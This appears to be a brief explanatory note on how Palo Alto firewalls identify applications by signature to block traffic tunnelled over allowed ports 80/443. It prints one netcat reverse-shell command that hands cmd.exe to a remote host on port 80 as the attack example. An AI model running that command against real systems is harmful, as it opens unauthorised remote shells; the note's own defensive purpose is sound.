Traditional firewalls traffic classification has always been conducted via a port and protocol process.

However the number or P2Ps that randomly change port numbers, content-based web applications that use HTTP 80/HTTPS 443 ports, and applications that use encryption and tunnelling to conceal communication content is increasing rapidly.

So a hacker can use port 80/443 because its allowed by the firewall.

Nc64.exe -nv 192.168.1.103 80 -e cmd.exe

If you were to have a vm try to use netcat while appid is on it will deny the traffic

Palo Alto Networks has developed an innovative approach to securing networks that identifies all traffic by applications using a variety of techniques.

Palo Alto firewalls use application signatures to identify whether the connection attempt is legitimate or not.
